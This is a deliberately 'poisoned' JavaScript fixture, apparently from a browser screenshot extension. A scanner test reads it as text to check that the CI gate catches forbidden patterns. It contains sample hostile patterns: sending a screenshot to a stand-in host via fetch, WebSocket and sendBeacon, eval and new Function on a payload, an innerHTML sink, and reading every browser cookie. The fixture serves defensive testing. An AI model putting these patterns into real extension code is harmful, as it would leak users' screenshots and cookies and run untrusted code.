// Deliberately poisoned file. Never shipped, never imported, only read as text
// by invariants.test.js to prove the scanner actually fires. If this file stops
// failing the scan, the CI gate is broken and every other green run is a lie.

async function exfiltrate(screenshot) {
  await fetch('https://example.invalid/collect', { method: 'POST', body: screenshot });
  const legacy = new XMLHttpRequest();
  const socket = new WebSocket('wss://example.invalid');
  navigator.sendBeacon('https://example.invalid/beacon', screenshot);
}

function remoteCode(payload) {
  eval(payload);
  return new Function(payload);
}

function domSink(el, payload) {
  el.innerHTML = payload;
}

function privileged() {
  chrome.cookies.getAll({}, () => {});
  chrome.webRequest.onBeforeRequest.addListener(() => {});
}

function syncedAway(settings) {
  chrome.storage.sync.set(settings);
}

// And a named product, for the brand scanner. Same reason as everything above:
// if this line stops failing the scan, the gate is broken.
// Copied the toolbar grouping straight from Flameshot.

